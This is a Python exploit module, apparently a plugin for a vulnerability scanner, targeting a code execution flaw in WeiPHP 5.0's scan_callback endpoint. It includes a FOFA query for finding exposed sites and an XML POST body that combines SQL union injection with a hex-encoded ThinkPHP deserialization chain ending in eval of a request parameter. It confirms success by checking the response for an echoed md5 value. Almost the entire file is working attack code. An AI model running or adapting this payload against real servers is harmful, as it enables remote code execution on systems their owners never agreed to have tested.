#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/CyDdTydTAiRQxuccGGI0_w',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'weiphp5.0 scan_callback 代码执行',

      'level'     :   'high',

      'FOFA'      :   '(body="content=\"WeiPHP" || body="/css/weiphp.css" || title="weiphp" || title="weiphp4.0")',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/11',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded',
      }
  target = '/public/index.php/weixin/Notice/index?img=echo+md5(123);exit();'
  body = '''
<xml>
<product_id>aaaa</product_id>
<appid>exp</appid>
<appid>=0) union select 1,2,3,4,5,6,7,0x4f3a32373a227468696e6b5c70726f636573735c70697065735c57696e646f7773223a313a7b733a33343a22007468696e6b5c70726f636573735c70697065735c57696e646f77730066696c6573223b613a313a7b693a303b4f3a31373a227468696e6b5c6d6f64656c5c5069766f74223a323a7b733a393a22002a00617070656e64223b613a313a7b733a333a226c696e223b613a313a7b693a303b733a323a223131223b7d7d733a31373a22007468696e6b5c4d6f64656c0064617461223b613a313a7b733a333a226c696e223b4f3a31333a227468696e6b5c52657175657374223a353a7b733a373a22002a00686f6f6b223b613a323a7b733a373a2276697369626c65223b613a323a7b693a303b723a383b693a313b733a353a226973436769223b7d733a363a22617070656e64223b613a323a7b693a303b723a383b693a313b733a363a226973416a6178223b7d7d733a393a22002a0066696c746572223b613a313a7b693a303b613a323a7b693a303b4f3a32313a227468696e6b5c766965775c6472697665725c506870223a303a7b7d693a313b733a373a22646973706c6179223b7d7d733a393a22002a00736572766572223b733a313a2231223b733a393a22002a00636f6e666967223b613a313a7b733a383a227661725f616a6178223b733a333a22696d67223b7d733a363a22002a00676574223b613a313a7b733a333a22696d67223b733a33303a223c3f70687020406576616c28245f524551554553545b27696d67275d293b223b7d7d7d7d7d7d,9,10,11,12-- </appid>
<mch_id>aaa</mch_id>
<nonce_str>aaa</nonce_str>
<openid>aaa</openid>
</xml>
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=body,timeout=10,verify=False)
    if res.status_code == 200 and re.search(r'202cb962ac59075b964b07152d234b70',res.text,re.S):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret